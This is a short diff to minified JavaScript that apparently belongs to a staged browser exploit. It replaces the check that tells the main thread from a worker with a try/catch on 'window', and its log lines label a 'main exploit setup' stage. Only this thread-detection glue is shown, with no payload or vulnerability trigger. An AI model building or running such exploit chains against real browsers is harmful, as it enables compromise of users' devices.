@@ -1495,8 +1495,17 @@ async function q(t, e) {
       return this.en.getBigUint64(0, true);
     }
   }
-  if (typeof self !== "undefined" && typeof self.postMessage === "function" && typeof self.onmessage !== "undefined") {
-    // Worker thread (self object, has postMessage)
+  try {
+    // Try to access 'window' - only main thread will have it as a reference
+    // In worker, accessing 'window' directly throws ReferenceError
+    const _ = window;
+    // Main thread code - window exists
+    et();
+    window.log("[STAGE1] >>> Starting main exploit setup (ht)");
+    ht(t);
+  } catch (detectionError) {
+    // Worker thread - window doesn't exist, caught by try/catch
+    // Worker thread code
     try {
       self.postMessage({ type: 0, msg: "worker_else_block_reached" });
       self.onmessage = (t) => {
@@ -1513,11 +1522,6 @@ async function q(t, e) {
         self.postMessage({ type: 0, msg: "worker_else_error: " + err.message });
       } catch(e) {}
     }
-  } else {
-    // Main thread (has window.log)
-    et();
-    window.log("[STAGE1] >>> Starting main exploit setup (ht)");
-    ht(t);
   }
 }
 async function X() {
